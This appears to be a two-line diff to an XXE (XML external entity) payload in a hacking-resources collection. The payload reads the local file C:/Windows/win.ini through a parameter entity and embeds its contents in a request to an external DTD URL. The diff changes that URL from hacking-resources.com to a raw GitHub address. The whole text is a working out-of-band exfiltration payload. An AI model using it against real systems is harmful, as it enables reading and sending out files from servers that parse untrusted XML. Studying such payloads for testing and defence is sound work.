@@ -1,2 +1,2 @@
 <!ENTITY % p1 SYSTEM "file:///C:/Windows/win.ini">
-<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://hacking-resources.com/ex.dtd?%p1;'>"> %p2
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'https://raw.githubusercontent.com/eslam-mohamed-reda/HackingResources/master/pages/ex.dtd?%p1;'>"> %p2
